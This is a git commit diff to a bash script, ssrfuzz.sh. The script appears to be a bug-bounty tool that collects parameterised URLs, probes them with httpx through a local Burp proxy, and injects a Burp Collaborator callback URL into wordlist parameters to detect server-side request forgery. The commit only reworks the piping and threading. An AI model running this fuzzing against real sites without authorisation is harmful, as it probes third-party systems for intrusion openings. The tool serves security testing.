a2c18cc698bcecdcd4b99ddf17906bac06a5cc41
redfr0g <redfr0g@protonmail.com>
2021-04-27 13:40:23 +0200

    Fallback to previous piping method with thread adjustment

--- ssrfuzz.sh
+++ ssrfuzz.sh
@@ -21,14 +21,11 @@ echo "[+] Found $(wc -l < $output) URLs"
 
 # Grep urls with parameters
 echo "[+] Extracting URLs with parameters"
-cat $output | grep "=" | sort -u | grep "?" | httpx -random-agent -silent > fuzz.txt
+cat $output | grep "=" | sort -u | grep "?" | httpx -retries 0 -threads 10 -http-proxy http://127.0.0.1:8080 -silent > fuzz.txt
 echo "[+] Got $(wc -l < fuzz.txt) fuzzable URLs"
 
 echo "[+] Fuzzing parameters (this may take a while)..."
 # Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
-for url in $(xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done')
-do
-  echo $url | httpx -silent -status-code -timeout 1 -http-proxy http://127.0.0.1:8080
-done
+xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' |  httpx -retries 0 -threads 10 -silent -status-code -http-proxy http://127.0.0.1:8080
 
 echo "[+] Finished! Check Burp Collaborator for any connections"
